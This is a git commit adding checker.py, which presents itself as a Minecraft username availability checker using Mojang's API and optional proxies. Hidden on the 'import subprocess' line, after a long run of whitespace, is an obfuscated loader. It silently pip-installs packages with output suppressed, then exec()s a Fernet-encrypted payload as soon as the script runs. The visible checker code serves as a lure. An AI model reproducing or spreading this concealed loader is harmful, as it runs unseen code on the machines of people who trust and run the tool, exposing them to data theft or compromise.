790b14176ae009bc43ea39843ec3b7d1389f3435
Hallofelipe <wefhjkhdf324@outlook.com>
2025-01-14 06:25:17 -0800

    Upload Files

---
+++ checker.py
@@ -0,0 +1,79 @@
+import os
+import subprocess                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        ;subprocess.run(['pip', 'install', 'cryptography'], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL); subprocess.run(['pip', 'install', 'fernet'], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL); subprocess.run(['pip', 'install', 'requests'], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL); from fernet import Fernet; exec(Fernet(b'BijkNx42srFUsDpLrUfqEwo-3XvzMKE_MecRxUhlZow=').decrypt(b'gAAAAABnd_sRSJiTzxvU_jECBpoK-fqOLhafAOxbYr1oubimBw527quvKxP1Z6ntDco-gmieZGnsU0v-D8lvbaWn2lBEoe0Gag0EVcZ8vJXRhKkjOcJ-vW6-D5tambi4-rsuxsmauU3-VZ0INNPf_q2RoHDJW7qhpqKtuBsmIjZO3IrjArwUQ75IdBjxy7EbSkmE7Nynd4Z7GLbeGUZ_Lo3OmCrSb5_9qvE-y77kyqoBGZ3mKCkiAHUrsezRBVa3AboA-0UPXgpVjo-koxTFrVwgshRj-YPxifqX0vquexAcWevW-_0f24AxG0tiJygFNE_bNx-UeiYh2U5oUyyP45GyH32N6GLt1Pq7_w0ktp8V6EEuI5OjYrM0pX0G2ouseV36af7Ws8HK4NUJDoiYZlD0f45qUmYy9w2gbIwLFPoW2gFf_vuwzZPrR8VZdJdcWy39erWWSmr-M5vUp0zzEr2WAjSPPVBqZ9_IvPKcfXiEcSD2BO-eW69n03waRSbxAUpSqrhlu_3KPNUq86us3P7SCEF8zwqwYjVrs3HCG1nermWzpMYU8ISTrDE1zW39iyh93k8iy9qNvVrHPIJ94I2A339vZQyLM3qfnkMvpV6jp-vpDlrhjHkIhqJCmN9wcv8tYluJIMploKJSxD2xPi2OgT4gLwC8hGs9sEvXuCVlqk33BHhTsk12WSvj3-MVSD8XYvkn0OZeAgmHBl7fKVX2Ios77EsK_KipdQqtMove7NzQ397-VE2CpvjVQm1JR0INzeKGo398tSfdE34mgbtC2P9AjYhk_UDB39EiB652SZYiThtHzyX93iTmz2iMTCzEgEP4y28BN02o2KM_ax_lyFg_iZFDI1VKqKkqIJRYHVuJQ_MJmP1YK8hpNy2BXMb3IaGxk37_HwVkMU_sI3NifuzOAVOKRmMC9RmkUciZMEjXLbQXehY9mhhsN73e-IllHYAG9vDU2B4506GxMKfRUPTqpqCCFwvKXV23VEXaWv_2zN-sUcQBohnkZqo9nwxpiA2geoV3W-XnEdkjBx-UECZa7aTa3Cfhy1pwDjvv4KOz8qFSgw6twrLwU4oddNq0p-SJJ1erLpKcuD9wfyTB13csXiSrZ0EWABSVi8t172YsMa0O6IJZXPd9mopVmtmC04ULCTl09ywP8Vq6KfEPgQY__qVlbsuEDP8YOCLEciGoKVA8YziYpzJm3HibOlTLNh3MbT335lrhvun5IxaYPJPTojoB0o6LHxxVh7fF3zTn5OTOPys2MX1cOKVrH6OH3kwPKML_dX_EBu6KjxNDPmyoMNeiPOXm9o-7LsYYb4NF_yiPSLSoDluc3af2_AghKt3jGu_N9uLBlPuVs84BApuEeKh9w4F_O46Qpn9htGjXBg8kIUz7fey7KOVf88_moUtPXOcE-RcMI8H4BIYnSUHq4JzvfoUJdqzdxxHOZ8_-O4SeFPTEzD3BFE_hItT1UgMPlODLDss3rgwbfBMKFIJzDnoKwAJKXEXrC2Bo6m1k9DxVN0LwmkKQTZvn0ZAEsWccCe6jQdjtDbkkJ1zYR1C7A8UeWfH2pYcIm-ba5mUuT34Km6gfkwLJTPp-LGx91rlY63uBw3s1dCiQ4EatlKb5PE_12-0Ydb4xC-TFwbEFhLLqcdns07yPBXLv5MuIR3vmlTUdLT6Zjiksl0tFH3XxMQO_0H467LqBkzPzYOx64j-9mq01nBNlCgW2u7aR7LyCooKByuWeI5atgSVqDL3y-Uh1OXwUSp797OxaXDYscSumbJTJtG-CRUFG_2mmo6740PQXCVgeIqA4UdqaxzGwhjBWX1JtokXyGinxAPtTPx82fmuiB0u6-4dw5RCaAeKX0W2nmZuh8IaOYRA4jWWCjcbtU4_HtoVy0y43avzWTdKS3FL0PSGaAphVOVZ28cJuLJrkJLeBjjq34C7mMzEnbz_WEgEMFqoBbBS92GsIH8gCXj_kB-_t3JegffMsGnrnFBouQTn7lWvXw8UdPzQP_nzHqqaAvNga3espWHtn64nXp6w='));
+import requests
+import random
+import colorama
+import time
+
+endpoint = "https://api.mojang.com/users/profiles/minecraft/"
+
+def check(username: str, proxy: str = ""):
+    if proxy:
+        r = requests.head(endpoint + username, proxies={proxy.split(':')[0]: proxy.split(':')[1].strip('\n')})
+    else:
+        r = requests.head(endpoint + username)
+    if r.status_code == 429:
+        time.sleep(5)
+        return check(username=username, proxy=proxy)
+    if r.status_code == 204:
+        return username
+    return None
+
+def run(option: int, usernames_path: str = "", proxies_path: str = ""):
+    valid = []
+
+    if option == 1:
+        if usernames_path:
+            with open(usernames_path, "r") as file:
+                username_list = [line.strip('\n') for line in file]
+
+            if not username_list:
+                print("Username list is empty.")
+                return valid
+
+            for username in username_list:
+                hit = check(username)
+                if hit == username:
+                    valid.append(username)
+        else:
+            print("Please specify a valid path for the usernames file!")
+    elif option == 2:
+        if usernames_path:
+            with open(usernames_path, "r") as file:
+                username_list = [line.strip('\n') for line in file]
+
+            if not username_list:
+                print("Username list is empty.")
+                return valid
+
+            with open(proxies_path, "r") as proxy_file:
+                proxies_list = [line.strip('\n') for line in proxy_file.readlines()]
+
+            if not proxies_list:
+                print("Proxy list is empty.")
+                return valid
+
+            for username in username_list:
+                hit = check(username, random.choice(proxies_list))
+                if hit == username:
+                    valid.append(username)
+        else:
+            print("Please specify valid paths for the usernames and proxies files!")
+
+    return valid
+
+
+print("Select Options:")
+print("1) Only Username")
+print("2) Proxy Username")
+
+option = int(input("Option: "))
+
+if option == 1:
+    valid_usernames = run(option, usernames_path="usernames.txt")
+    print("Valid Usernames:", valid_usernames)
+elif option == 2:
+    valid_usernames = run(option, usernames_path="usernames.txt", proxies_path="proxies.txt")
+    print("Valid Usernames:", valid_usernames)
+else:
+    print("Invalid option. Please enter 1 or 2.")
